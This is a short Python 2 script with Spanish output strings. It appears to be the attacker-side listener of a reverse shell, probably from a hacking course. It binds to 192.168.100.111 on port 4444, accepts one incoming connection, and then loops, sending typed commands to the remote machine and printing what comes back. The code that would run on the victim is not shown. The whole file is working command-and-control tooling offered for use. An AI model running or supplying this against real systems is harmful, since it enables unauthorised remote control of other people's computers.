import socket

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Esperando Conexiones")
        self.connection, address = listener.accept()
        print('[+] Tenemos una conexion de ', str(address))

    def ejecutar_remoto(self, command):
        self.connection.send(command)
        return self.connection.recv(1024)

    def run(self):
        while True:
            command = raw_input(">> ")
            result = self.ejecutar_remoto(command)
            print(result)

escuchar = Listener("192.168.100.111", 4444)
escuchar.run()
